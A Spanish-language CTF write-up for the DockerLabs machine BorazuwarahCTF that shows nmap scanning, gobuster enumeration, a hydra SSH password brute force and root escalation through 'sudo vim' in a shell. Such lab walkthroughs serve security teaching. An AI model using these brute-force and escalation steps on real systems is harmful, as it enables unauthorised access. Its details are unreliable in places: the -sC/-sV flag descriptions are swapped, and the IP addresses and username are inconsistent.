## WRITEUP DE LA MAQUINA BORAZUWARAHCTF DE DOCKERLABS EN ESPAÑOL

Sitio web - https://dockerlabs.es/#/

Hacemos un escaneo de puertos mediante la herramienta nmap, esto casi siempre es el comienzo para la resolución de una máquina o CTF.

```shell
└─$ nmap -sV -sC 172.18.0.2 -oN outputscan.txt
```
"-sC" Muestra la versión del servicio del puerto abierto.
<br><br>
"-sV" Ejecuta scripts propios de Nmap que, entre otras cosas, descubren información detallada sobre los servicios.
<br><br>
"172.18.0.2" Es la dirección IP de la máquina víctima.
<br><br>
"-oN outputscan.txt" Sirve para que te copie el resultado del escaneo en el fichero que tú le indiques (no hay que crearlo antes, lo crea solo). Esto lo hago por si más tarde quiero volver a ver el escaneo pero no quiero tener que hacerlo de nuevo.

En este caso no he utlizado ni "-p-", ni "-n", ni "--min-rate 5000" ya que me tardaba mucho hacer el escaneo y para algo tan sencillo es más eficaz y rapido ejecutar un comando más corto.

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-18 17:13 EDT
Nmap scan report for 172.18.0.2
Host is up (0.00017s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 19:a1:1a:42:fa:3a:9d:9a:0f:ea:91:7f:7e:db:a3:c7 (ECDSA)
|_  256 a6:fd:cf:45:a6:95:05:2c:58:10:73:8d:39:57:2b:ff (ED25519)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.57 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.58 seconds
```

Vemos que el puerto 22 y 80 de los servicios ssh y http respectivamente estan abiertos. Empezaremos por ver que sitio web encontramos con la IP víctima (172.18.0.2):

![alt text](/fotos/debian.png)

Vamos a optar por hacer un ataque de fuerza bruta mediante la herramienta gobuster. Lo que vamos a intentar es encontrar directorios o ficheros ocultos que nos den pistas.

```
└─$ gobuster dir -u http://172.18.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
```
El modo dir indica que Gobuster realizará una enumeración de directorios y archivos.
"-u" Especifica la URL del objetivo que Gobuster escaneará. En este caso, el objetivo es http://172.18.0.2/.
<br><br>
"-w" Especifica la lista de palabras (wordlist) que Gobuster usará para la fuerza bruta. La lista de palabras contiene nombres de directorios y archivos comunes que Gobuster intentará encontrar en el servidor web. Aquí se está utilizando una lista de palabras proporcionada por DirBuster, llamada directory-list-2.3-medium.txt.
<br><br>
"-x" Especifica las extensiones de archivos que Gobuster intentará agregar a cada entrada en la lista de palabras. En este caso, Gobuster probará cada palabra con las extensiones .php Esto significa que si una entrada en la lista de palabras es admin, Gobuster probará admin.php

El resultado:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.18.0.2/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 275]
/.                    (Status: 200) [Size: 10701]
/secret.php           (Status: 200) [Size: 927]
/.php                 (Status: 403) [Size: 275]
/.                    (Status: 200) [Size: 10701]

```

Vemos algo sospechoso, "/secret.php" nos da a entender que ahí hay algo. En la URL junto al 172.18.0.2 escribimos ese fichero php y vemos esta página:

![alt text](/fotos/mario.png)

Al ser una máquina tan sencilla se entiende que ese tal Mario será el nombre de usuario al que a continuación intentaremos conectarnos mediante ssh, pero antes de eso necesitamos saber su contraseña. Lo haremos mediante fuerza bruta esta vez con la herramienta hydra:

```
└─$ hydra -l mario -P /home/kali/Desktop/rockyou.txt ssh://172.18.0.2 -t 5
```

"-l mario" Indica qué nombre de usuario va a usar en el ataque, en este caso buscamos a russoski.
<br><br>
"-P /home/kali/Desktop/rockyou.txt" Especifica la wordlist de contraseñas que va a usar para probar el ataque de fuerza bruta, cada uno pone la ruta donde se encuentre su fichero wordlist.
<br><br>
"ssh://172.18.0.2/" Especifica el protocolo y la dirección del objetivo del ataque. En este caso, se está atacando el servicio SSH (Secure Shell) en la dirección IP 172.17.0.2
<br><br>
"-t 5" Especifica el número de tareas (threads) paralelas que Hydra debe usar durante el ataque. En este caso, -t 5 indica que Hydra debe utilizar 5 hilos de ejecución simultáneos para probar las combinaciones de nombre de usuario y contraseña. (Nos va a tomar un par de minutos)

Obtenemos lo siguiente:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-09-18 17:16:37
[DATA] max 5 tasks per 1 server, overall 5 tasks, 14344399 login tries (l:1/p:14344399), ~2868880 tries per task
[DATA] attacking ssh://172.18.0.2:22/

[22][ssh] host: 172.18.0.2   login: mario   password: chocolate

1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-09-18 17:17:31
```

Sabemos que la contraseña es "chocolate", ahora si, nos conectamos mediante ssh y ponemos dicha contraseña:

```
ssh mario@178.18.0.2
```

```
mario@0887a732b61d:~$ whoami
mario@0887a732b61d:~$ mario
```

Toca escalar privilegios. Escribimos el comando "sudo -l" el cual permite a un usuario verificar qué comandos tienen permiso para ejecutar como superusuario (o cualquier otro usuario especificado). 

```
mario@0887a732b61d:~$ sudo -l
[sudo] password for mario: 
Matching Defaults entries for mario on 0887a732b61d:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User mario may run the following commands on 0887a732b61d:
    (ALL) /usr/bin/vim
```

Vamos a explotar el binario vim mediante el sitio web GTFObins (https://gtfobins.github.io/#) para escalar privilegios. Con buscar "vim" en el buscador de la página e ir al partado de sudo, encontramos nuestra forma de ser root, en este caso tendremos que ejecutar " sudo vim -c ':!/bin/sh' "

```
mario@0887a732b61d:~$ sudo vim -c ':!/bin/sh'
# whoami
root
```
Ya somos root, espero que os haya gustado este writeup, muchas gracias!